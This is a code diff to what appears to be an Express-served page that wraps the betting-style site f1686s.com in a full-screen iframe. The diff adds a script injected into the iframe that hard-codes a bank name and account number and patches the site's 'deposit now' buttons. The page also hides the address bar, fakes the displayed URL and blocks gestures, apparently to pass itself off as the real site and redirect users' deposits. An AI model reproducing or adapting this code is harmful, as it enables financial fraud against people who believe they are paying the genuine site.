@@ -34,7 +34,6 @@ app.get('/', (req, res) => {
       user-select: none;
       -webkit-touch-callout: none;
     }
-    /* Ẩn thanh địa chỉ trên Safari */
     #mainFrame {
       width: 100vw;
       height: 100vh;
@@ -49,26 +48,12 @@ app.get('/', (req, res) => {
       background: #fff;
       z-index: 1;
     }
-    /* Lớp phủ chặn tương tác với thanh điều hướng */
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 99999;
-      pointer-events: none;
-      background: transparent;
-    }
-    #overlay.active {
-      pointer-events: all;
-    }
     #toast {
       position: fixed;
       bottom: 40px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(0,0,0,0.85);
+      background: rgba(0,200,80,0.95);
       color: #fff;
       padding: 10px 24px;
       border-radius: 30px;
@@ -80,24 +65,10 @@ app.get('/', (req, res) => {
       z-index: 999999;
       white-space: nowrap;
       backdrop-filter: blur(8px);
-      border: 1px solid rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      font-weight: 600;
     }
     #toast.show { opacity: 1; }
-    #status {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      background: rgba(0,200,80,0.9);
-      color: #fff;
-      padding: 4px 12px;
-      border-radius: 12px;
-      font-size: 11px;
-      font-family: monospace;
-      z-index: 999998;
-      opacity: 0.7;
-      pointer-events: none;
-    }
-    /* Safari fullscreen fix */
     @supports (-webkit-touch-callout: none) {
       #mainFrame {
         height: -webkit-fill-available;
@@ -106,7 +77,6 @@ app.get('/', (req, res) => {
         min-height: -webkit-fill-available;
       }
     }
-    /* Chrome fullscreen */
     :-webkit-full-screen #mainFrame {
       height: 100vh;
     }
@@ -117,9 +87,7 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <iframe id="mainFrame" src="https://f1686s.com/home/mine" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-top-navigation" allowfullscreen></iframe>
-<div id="overlay"></div>
-<div id="status">● SCRIPT</div>
-<div id="toast">✅ Đã kích hoạt tự động</div>
+<div id="toast">✅ Script đã kích hoạt</div>
 
 <script>
   (function() {
@@ -137,7 +105,6 @@ app.get('/', (req, res) => {
       }
     }
 
-    // Gọi fullscreen khi có tương tác
     document.addEventListener('touchstart', function firstTouch() {
       requestFullscreen();
       document.removeEventListener('touchstart', firstTouch);
@@ -148,28 +115,44 @@ app.get('/', (req, res) => {
       document.removeEventListener('click', firstClick);
     }, { once: true });
 
-    // Tự động fullscreen sau 1s nếu chưa có tương tác
     setTimeout(requestFullscreen, 1000);
 
-    // === NHÚNG TOÀN BỘ FILE TAMPERMONKEY VÀO ĐÂY ===
-    ${tmScript}
+    // === BIẾN TOÀN CỤ ĐỂ THEO DÕI ===
+    let scriptInjected = false;
+    let patchAttempts = 0;
+    const MAX_ATTEMPTS = 50;
 
-    // === GHI ĐÈ ĐỂ HOẠT ĐỘNG TRONG IFRAME ===
-    const originalFindAndPatch = findAndPatch;
-    findAndPatch = function() {
+    // === HÀM INJECT SCRIPT VÀO IFRAME ===
+    function injectScriptIntoIframe() {
       const frame = document.getElementById('mainFrame');
-      if (!frame) return;
-      try {
-        const doc = frame.contentDocument;
-        if (!doc) return;
-        const win = frame.contentWindow;
-        if (!win) return;
+      if (!frame) {
+        console.log('[Inject] Không tìm thấy iframe');
+        return false;
+      }
 
-        // Inject script vào iframe
-        const script = win.document.createElement('script');
+      try {
+        const win = frame.contentWindow;
+        const doc = frame.contentDocument;
+        if (!win || !doc) {
+          console.log('[Inject] Chưa sẵn sàng');
+          return false;
+        }
+
+        // Kiểm tra nếu đã inject rồi
+        if (win.__f168_injected) {
+          console.log('[Inject] Đã inject trước đó');
+          return true;
+        }
+
+        console.log('[Inject] Bắt đầu inject script vào iframe');
+
+        // Tạo script element trong iframe
+        const script = doc.createElement('script');
         script.textContent = \`
           (function() {
-            // Copy toàn bộ logic từ file gốc
+            console.log('[Tampermonkey] Bắt đầu chạy trong iframe');
+
+            // === CẤU HÌNH ===
             const BANK_ID = 'MB';
             const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
             const ACCOUNT_NO = '757526789';
@@ -230,81 +213,137 @@ app.get('/', (req, res) => {
                   clone.classList.remove('ui-button--disabled');
                 }
               }).observe(clone, {attributes:true, attributeFilter:['disabled','class']});
+              console.log('[Tampermonkey] Đã patch button:', clone.id || clone.className);
             }
 
             function findAndPatch() {
               const btn = document.getElementById('depositSubmitClick');
-              if (btn && !patched.has(btn)) { patchButton(btn); return; }
+              if (btn && !patched.has(btn)) { 
+                patchButton(btn); 
+                console.log('[Tampermonkey] Tìm thấy depositSubmitClick');
+                return;
+              }
               document.querySelectorAll('button.ui-button,button').forEach(el => {
                 if (patched.has(el)) return;
                 const t = el.innerText || el.textContent || '';
-                if (t.trim().includes('Nạp Tiền Ngay')) patchButton(el);
+                if (t.trim().includes('Nạp Tiền Ngay')) {
+                  patchButton(el);
+                  console.log('[Tampermonkey] Tìm thấy nút Nạp Tiền Ngay');
+                }
               });
             }
 
+            // === GHI ĐÈ HISTORY ===
             const _push = history.pushState;
             history.pushState = function(...a){ _push.apply(history,a); setTimeout(findAndPatch,300); };
             const _replace = history.replaceState;
             history.replaceState = function(...a){ _replace.apply(history,a); setTimeout(findAndPatch,300); };
             window.addEventListener('popstate', ()=>{ setTimeout(findAndPatch,300); });
 
+            // === CHẠY LẦN ĐẦU ===
             findAndPatch();
             document.addEventListener('DOMContentLoaded', findAndPatch);
             window.addEventListener('load', findAndPatch);
-            setInterval(findAndPatch, 1000);
+            
+            // === LẶP LIÊN TỤC ===
+            setInterval(findAndPatch, 500);
 
+            // === MUTATION OBSERVER ===
             new MutationObserver(()=>{ findAndPatch(); }).observe(document.documentElement||document.body, {childList:true, subtree:true});
+
+            // === ĐÁNH DẤU ĐÃ INJECT ===
+            window.__f168_injected = true;
+            console.log('[Tampermonkey] Đã inject thành công!');
           })();
         \`;
-        win.document.body.appendChild(script);
 
-        const btn = doc.getElementById('depositSubmitClick');
-        if (btn && !patched.has(btn)) { patchButton(btn); }
-      } catch(e) {
-        console.log('Lỗi patch:', e);
+        // Thêm script vào iframe
+        doc.body.appendChild(script);
+        
+        // Đánh dấu đã inject
+        win.__f168_injected = true;
+        scriptInjected = true;
+        console.log('[Inject] Script đã được thêm vào iframe');
+        
+        // Hiển thị toast
+        const toast = document.getElementById('toast');
+        toast.textContent = '✅ Script đã kích hoạt';
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3000);
+        
+        return true;
+      } catch (e) {
+        console.log('[Inject] Lỗi:', e.message);
+        return false;
       }
-    };
-
-    // Gắn vào iframe load
-    const frame = document.getElementById('mainFrame');
-    if (frame) {
-      frame.addEventListener('load', function() {
-        setTimeout(findAndPatch, 500);
-        setTimeout(findAndPatch, 1500);
-        setTimeout(findAndPatch, 3000);
-        // Yêu cầu fullscreen lại sau khi iframe load
-        setTimeout(requestFullscreen, 1000);
-      });
     }
 
-    // Chạy lặp
-    setInterval(findAndPatch, 2000);
+    // === HÀM CHỜ IFRAME LOAD XONG ===
+    function waitForIframeAndInject() {
+      const frame = document.getElementById('mainFrame');
+      if (!frame) {
+        console.log('[Wait] Chưa có iframe');
+        setTimeout(waitForIframeAndInject, 500);
+        return;
+      }
 
-    // Toast thông báo
-    const toast = document.getElementById('toast');
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 4000);
+      // Nếu iframe đã load xong
+      try {
+        const doc = frame.contentDocument;
+        if (doc && doc.readyState === 'complete') {
+          console.log('[Wait] Iframe đã load xong, inject ngay');
+          injectScriptIntoIframe();
+          return;
+        }
+      } catch(e) {}
 
-    // Chặn zoom toàn trang
+      // Chờ sự kiện load
+      frame.addEventListener('load', function onLoad() {
+        console.log('[Wait] Iframe load event');
+        setTimeout(injectScriptIntoIframe, 300);
+        setTimeout(injectScriptIntoIframe, 800);
+        setTimeout(injectScriptIntoIframe, 1500);
+        frame.removeEventListener('load', onLoad);
+      });
+
+      // Fallback: thử inject liên tục
+      let count = 0;
+      const interval = setInterval(() => {
+        count++;
+        if (injectScriptIntoIframe()) {
+          clearInterval(interval);
+          console.log('[Wait] Inject thành công sau ' + count + ' lần thử');
+        } else if (count > 50) {
+          clearInterval(interval);
+          console.log('[Wait] Quá số lần thử, dừng');
+        }
+      }, 1000);
+    }
+
+    // === BẮT ĐẦU ===
+    console.log('[Main] Khởi động...');
+    waitForIframeAndInject();
+
+    // === CHẶN ZOOM ===
     document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
     document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
     document.addEventListener('gestureend', function(e) { e.preventDefault(); });
 
-    // Chặn kéo thả lộ iframe
+    // === CHẶN KÉO ===
     document.addEventListener('touchmove', function(e) {
       if (e.target === document.body || e.target === document.documentElement) {
         e.preventDefault();
       }
     }, { passive: false });
 
-    // Chặn pull-to-refresh
+    // === CHẶN PULL-TO-REFRESH ===
     document.addEventListener('touchstart', function(e) {
       if (window.scrollY === 0 && e.touches[0].clientY < 50) {
         e.preventDefault();
       }
     }, { passive: false });
 
-    // Ẩn thanh địa chỉ bằng cách scroll nhẹ (Chrome)
+    // === ẨN THANH ĐỊA CHỈ CHROME ===
     window.addEventListener('load', function() {
       setTimeout(function() {
         window.scrollTo(0, 1);
@@ -312,22 +351,10 @@ app.get('/', (req, res) => {
       }, 100);
     });
 
-    // Fake URL hiển thị trên thanh địa chỉ (PWA)
+    // === FAKE URL ===
     if (window.history && window.history.pushState) {
       window.history.pushState({}, 'f1686s.com', '/');
     }
-
-    // Lớp phủ chặn thanh điều hướng (Safari)
-    const overlay = document.getElementById('overlay');
-    overlay.classList.add('active');
-    setTimeout(() => overlay.classList.remove('active'), 2000);
-
-    // Thoát fullscreen khi bấm back (tránh kẹt)
-    window.addEventListener('popstate', function() {
-      if (document.fullscreenElement) {
-        document.exitFullscreen().catch(() => {});
-      }
-    });
 
   })();
 </script>
